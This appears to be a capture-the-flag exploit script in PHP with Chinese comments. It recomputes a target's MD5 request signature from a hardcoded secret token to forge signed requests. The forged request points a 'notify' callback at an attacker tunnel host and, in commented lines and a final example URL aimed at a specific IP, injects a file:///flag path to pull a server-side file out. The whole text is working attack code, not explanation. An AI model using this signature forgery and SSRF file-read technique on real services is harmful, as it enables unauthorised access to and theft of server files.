?<?php
function sign_params($params): string
    {   
        $token = 'QiuQIuYyds';
        // 过滤参数
        $params = array_filter($params,function($key) use ($params){
            if(empty($params[$key]) || $key == 'sign'){
                return false;
            }
            return true;
        },ARRAY_FILTER_USE_KEY);

        // ascii排序
        ksort($params);
        reset($params);

        // 签名
        return md5(urldecode(http_build_query($params)) . $token);//绕过!
}
$params = [
    'uid' => 'aaabb', // 替换为目标用户的实际 ID
    'notify' => 'http://5e3bb4e2.r28.cpolar.top/', // 伪造的通知 URL
    // 'file' => 'file:///flag' // 伪造的文件路径
];

$token = 'QiuQIuYyds'; // 已知的 token
$signature = md5(urldecode(http_build_query($params)) . $token);
echo sign_params(params: $params);
// upload_notify($notify,$params);
// http://121.41.53.189:36446/?uid=aa&notify=file:///flag&sign=fcfd46d234326f64bd3f9b6f97cf3748&file=file:///flag